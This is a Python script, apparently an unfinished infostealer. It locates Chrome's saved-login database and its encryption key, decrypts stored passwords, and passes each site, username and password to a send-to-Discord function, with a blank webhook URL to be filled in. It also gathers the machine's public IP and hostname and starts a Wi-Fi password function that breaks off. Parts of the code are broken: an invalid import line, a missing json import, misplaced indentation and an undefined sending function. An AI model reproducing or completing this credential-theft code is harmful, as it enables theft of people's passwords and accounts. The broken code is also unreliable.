import sqlite3
import win32crypt
import os
import socket
import requests import get
import subprocess
import base64
 from Crypto.Cipher import AES
import browser_cookie3
WEBHOOK_URL = "" # Put your discod webhook
#i will work on this later

def decrypt_password(encrypted_password, key):
    try:
        encrypted_password = encrypted_password[3:]
        cipher = AES.new(key, AES.MODE_GCM, encrypted_password[:12])
        decrypted_password = cipher.decrypt(encrypted_password[12:-16]).decode('utf-8')
        return decrypted_password
    except Exception as e:
        print("Failed to decrypt password:", str(e))
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                  "AppData", "Local", "Google", "Chrome",
                                  "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)[5:]

    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

    

def get_chrome_passwords():
    data_path = os.path.join(os.environ["USERPROFILE"],
                             "AppData", "Local", "Google", "Chrome",
                             "User Data", "Default", "Login Data")

    try:
        connection = sqlite3.connect(data_path)
        cursor = connection.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()

        encryption_key = get_encryption_key()

        for url, username, encrypted_password in login_data:
            decrypted_password = decrypt_password(encrypted_password, encryption_key)
            send_to_discord(url, username, decrypted_password)

    except Exception as e:
        print("Error accessing Chrome passwords:", str(e))
    finally:
        cursor.close()
        connection.close()



def get_ip(ip,name):
  ip = get('https://api.ipify.org').text
print('My public IP address is: {}'.format(ip))
  name  = socket.gethostname()


def Get_Wifi_Passwords():
  wifi 

